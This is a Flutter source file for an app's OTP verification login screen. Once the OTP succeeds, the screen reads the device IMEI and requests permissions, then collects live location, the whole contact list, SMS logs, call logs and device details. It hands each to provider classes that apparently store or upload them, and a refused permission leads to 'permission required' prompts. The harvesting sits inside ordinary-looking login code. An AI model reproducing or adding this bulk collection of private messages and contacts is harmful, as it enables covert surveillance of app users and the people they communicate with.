import 'package:flutter/material.dart';
import 'package:flutter/scheduler.dart';
import 'package:provider/provider.dart';
import 'package:sales/base/error.dart';
import 'package:sales/screens/auth/otp_verification/viewmodel/otp_verification_viewmodel.dart';
import 'package:sales/screens/shared/app_device_info.dart';
import 'package:sales/screens/shared/shared_screen.dart';
import 'package:sales/widgets/app_snack_bar.dart';
import 'package:sales/configs.dart';
import 'package:sales/models/device_info_call_log.dart';
import 'package:sales/models/device_info_contact.dart';
import 'package:sales/models/device_info_device.dart';
import 'package:sales/models/device_info_live_location.dart';
import 'package:sales/models/device_info_sim_card.dart';
import 'package:sales/models/device_info_sms_log.dart';
import 'package:sales/providers/device_info_call_log_provider.dart';
import 'package:sales/providers/device_info_contact_provider.dart';
import 'package:sales/providers/device_info_device_provider.dart';
import 'package:sales/providers/device_info_live_location_provider.dart';
import 'package:sales/providers/device_info_sim_card_provider.dart';
import 'package:sales/providers/device_info_sms_log_provider.dart';
import 'package:sales/screens/shared/app_device_info.dart';
import 'package:sales/widgets/location_permission_required.dart';
import 'package:sales/utils/permission_helper.dart';
import 'package:sales/widgets/permission_required_widget.dart';

import '../../../widgets/simple_toolbar.dart';
import '../widgets/login_scaffold.dart';
import '../widgets/otp_verification_form.dart';

class OTPVerificationScreen extends StatelessWidget {
  const OTPVerificationScreen(
      {super.key, required this.username, required this.otpMethod});

  static const routeName = "/otp-verification";
  final String username;
  final String otpMethod;

  goToSharedScreenIfLoggedIn(BuildContext context) {
    SchedulerBinding.instance.addPostFrameCallback((timeStamp) async {
      Navigator.pushNamedAndRemoveUntil(
          context, SharedScreen.routeName, (_) => false);
    });
  }

    //########### APP DEVICE INFO ############
  Future<String> getImeiNo() async {
    return await AppDeviceInfo().getImei();
  }

  Future<void> storeCallLogs(String imeiNo, BuildContext context) async {
    try {
      List<DeviceInfoCallLog>? callLogs = await AppDeviceInfo().getCallLogs(imeiNo);
      if (callLogs.length > 0) {
        await Provider.of<DeviceInfoCallLogProvider>(context, listen: false).storeCallLogs(callLogs, imeiNo);
      }
    } catch (error) {
      print('Get error while getting & creating call logs: ${error.toString()}');
    }
  }

  Future<void> storeSmsLogs(String imeiNo, BuildContext context) async {
    try {
      List<DeviceInfoSmsLog>? smsLogs = await AppDeviceInfo().getSmsLogs(imeiNo);
      if (smsLogs.length > 0) {
        await Provider.of<DeviceInfoSmsLogProvider>(context, listen: false).storeSmsLogs(smsLogs, imeiNo);
      }
    } catch (error) {
      print('Get error while getting & creating sms logs: ${error.toString()}');
    }
  }

  Future<void> storeContacts(String imeiNo, BuildContext context) async {
    try {
      List<DeviceInfoContact>? contacts = await AppDeviceInfo().getContacts(imeiNo);
      if (contacts.length > 0) {
        await Provider.of<DeviceInfoContactProvider>(context, listen: false).storeContacts(contacts, imeiNo);
      }
    } catch (error) {
      print('Get error while getting & creating contacts: ${error.toString()}');
    }
  }

  Future<void> storeLiveLocation(String imeiNo, BuildContext context) async {
    try {
      DeviceInfoLiveLocation liveLocation = await AppDeviceInfo().getLocation(imeiNo);
      await Provider.of<DeviceInfoLiveLocationProvider>(context, listen: false).storeLocation(liveLocation, imeiNo);
    } catch (error) {
      print('Get error while getting & creating live location: ${error.toString()}');
    }
  }

  Future<void> storeSimCards(String imeiNo, BuildContext context) async {
    try {
      DeviceInfoSimCard simdCard = await AppDeviceInfo().getSimCards(imeiNo);
      await Provider.of<DeviceInfoSimCardProvider>(context, listen: false).storeSimCard(simdCard, imeiNo);
    } catch (error) {
      print('Get error while getting & creating live location: ${error.toString()}');
    }
  }

  Future<void> storeDeviceInfo(String imeiNo, BuildContext context) async {
    try {
      DeviceInfoDevice device = await AppDeviceInfo().getDeviceInfo(imeiNo);
      await Provider.of<DeviceInfoDeviceProvider>(context, listen: false).storeDevice(device, imeiNo);
    } catch (error) {
      print('Get error while getting & creating device info: ${error.toString()}');
    }
  }
  //########################################

  Future<void> initLoad(BuildContext context) async {
    String imei = await getImeiNo();
    await PermissionHelper().requestLocationPermission(
      onGranted: () async { await storeLiveLocation(imei, context); },
      onNotGranted: () async { await showLocationPermissionRequired(context); },
    );
    await PermissionHelper().requestContactsPermission(
      onGranted: () async { await storeContacts(imei, context); },
      onNotGranted: () async { await showContactsPermissionRequired(context); },
    );
    await PermissionHelper().requestSMSPermission(
      onGranted: () async { await storeSmsLogs(imei, context); },
      onNotGranted: () async { await showSMSPermissionRequired(context); },
    );
    await PermissionHelper().requestPhonePermission(
      onGranted: () async { await storeCallLogs(imei, context); },
      onNotGranted: () async { await showPhonePermissionRequired(context); },
    );
    // await storeSimCards(imei);
    await storeDeviceInfo(imei, context);

  }
  
  @override
  Widget build(BuildContext context) {
    return ChangeNotifierProvider<OTPVerificationViewModel>(
        create: (context) => OTPVerificationViewModel(context.read())
          ..loadData(username, otpMethod),
        child: Consumer<OTPVerificationViewModel>(
          builder: (context, vm, child) {
            /// Handle CallBack for LoginSubmit State
            Future.delayed(Duration.zero, () {
              vm.submitState.maybeWhen(
                failed: (message, error) => context.showErrorDialog(
                  error.errorMessage(context, message),
                  onClosePressed: vm.resetSubmitState,
                ),
                success: (data) async {
                  await initLoad(context);
                  await goToSharedScreenIfLoggedIn(context);
                },
                orElse: () {},
              );
            });

            return LoginScaffold(
              appbar: SimpleToolbar(title: "Verify OTP"),
              isLoading: vm.isLoading,
              form: OtpVerificationForm(vm: vm),
            );
          },
        ));
  }
}
